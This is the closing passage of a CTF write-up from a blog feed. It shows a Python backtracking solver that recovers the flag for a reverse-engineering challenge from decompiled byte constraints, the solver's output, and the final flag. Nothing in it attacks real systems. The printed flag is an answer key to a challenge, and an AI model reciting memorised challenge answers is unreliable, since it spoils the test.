        <span class="p">([</span><span class="mi">6</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">],</span>   <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">23</span><span class="p">])</span> <span class="o">*</span> <span class="n">f</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">==</span> <span class="o">-</span><span class="mi">9922</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">21</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">24</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">|</span> <span class="n">f</span><span class="p">[</span><span class="mi">24</span><span class="p">])</span> <span class="o">&amp;</span> <span class="n">f</span><span class="p">[</span><span class="mi">21</span><span class="p">])</span> <span class="o">==</span> <span class="mi">95</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">14</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">25</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="n">f</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">((</span><span class="n">f</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">%</span> <span class="n">f</span><span class="p">[</span><span class="mi">25</span><span class="p">])</span> <span class="o">+</span> <span class="n">f</span><span class="p">[</span><span class="mi">14</span><span class="p">])</span> <span class="o">==</span> <span class="mi">194</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">19</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">26</span><span class="p">],</span>  <span class="k">lambda</span><span class="p">:</span> <span class="n">f</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">*</span> <span class="n">f</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">//</span> <span class="n">f</span><span class="p">[</span><span class="mi">19</span><span class="p">])</span> <span class="o">==</span> <span class="mi">33</span><span class="p">),</span>
        <span class="p">([</span><span class="mi">25</span><span class="p">,</span><span class="mi">26</span><span class="p">],</span>      <span class="k">lambda</span><span class="p">:</span> <span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">-</span> <span class="mi">110</span> <span class="o">-</span> <span class="n">f</span><span class="p">[</span><span class="mi">25</span><span class="p">])</span> <span class="o">==</span> <span class="o">-</span><span class="mi">177</span><span class="p">)</span>
    <span class="p">]</span>

    <span class="k">def</span> <span class="nf">all_constraints_ok</span><span class="p">():</span>
        <span class="s">"""Check all constraints that refer only to known bytes."""</span>
        <span class="k">for</span> <span class="n">indices</span><span class="p">,</span> <span class="n">check</span> <span class="ow">in</span> <span class="n">constraints</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">f</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="ow">is</span> <span class="bp">None</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indices</span><span class="p">):</span>
                <span class="k">continue</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">check</span><span class="p">():</span>
                <span class="k">return</span> <span class="bp">False</span>
        <span class="k">return</span> <span class="bp">True</span>

    <span class="k">def</span> <span class="nf">backtrack</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
        <span class="s">"""Recursively assign values to f[5..26] satisfying all constraints."""</span>
        <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">26</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">all_constraints_ok</span><span class="p">():</span>
                <span class="n">solutions_found</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">f</span><span class="p">[:])</span>
            <span class="k">return</span>

        <span class="c1"># Skip fixed indices if already set.
</span>        <span class="k">if</span> <span class="n">f</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">all_constraints_ok</span><span class="p">():</span>
                <span class="k">return</span>
            <span class="n">backtrack</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
            <span class="k">return</span>

        <span class="c1"># Try all printable ASCII values for f[i].
</span>        <span class="k">for</span> <span class="n">candidate</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="mi">127</span><span class="p">):</span>
            <span class="c1"># For index 5, apply constraint 5 early.
</span>            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">5</span> <span class="ow">and</span> <span class="p">(</span><span class="mi">123</span> <span class="o">&amp;</span> <span class="n">candidate</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">112</span><span class="p">:</span>
                <span class="k">continue</span>
            <span class="n">f</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">candidate</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">all_constraints_ok</span><span class="p">():</span>
                <span class="k">continue</span>
            <span class="n">backtrack</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">f</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="n">backtrack</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">solutions_found</span>

<span class="n">sol</span> <span class="o">=</span> <span class="n">solve_flag</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[INFO] Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">sol</span><span class="p">)</span><span class="si">}</span><span class="s"> solution(s)."</span><span class="p">)</span>
<span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">sol</span><span class="p">:</span>
    <span class="n">txt</span> <span class="o">=</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[INFO] Valid solution =&gt; </span><span class="si">{</span><span class="n">txt</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

</code></pre></div></div>

<p>Running the solver will give the following results</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python solver3.py
<span class="o">[</span>INFO] Found 1 solution<span class="o">(</span>s<span class="o">)</span><span class="nb">.</span>
<span class="o">[</span>INFO] Valid solution <span class="o">=&gt;</span> flag<span class="o">{</span>pyth0n_d3c0mp!l3_!s_f#n<span class="o">}</span>
</code></pre></div></div>

<p>The flag is <code class="language-plaintext highlighter-rouge">flag{pyth0n_d3c0mp!l3_!s_f#n}</code></p>

<p>Alternatively, I think the intended solution was to to patch <code class="language-plaintext highlighter-rouge">pycdc</code> using the following guide <a href="https://idafchev.github.io/blog/Decompile_python/#decompiling-python-above-39">Decompiling python above 3.9</a>.</p>

<hr />

<p>And that’s concludes the write-up for the Cyber-Talents New year Challenge (2025), i hope you enjoyed it, and learned something new.</p>]]></content><author><name></name></author><category term="Ctf" /><category term="challenges" /><summary type="html"><![CDATA[New Year Challenge 2025 » Apple General Information / Basic / 25 (pts)]]></summary></entry></feed>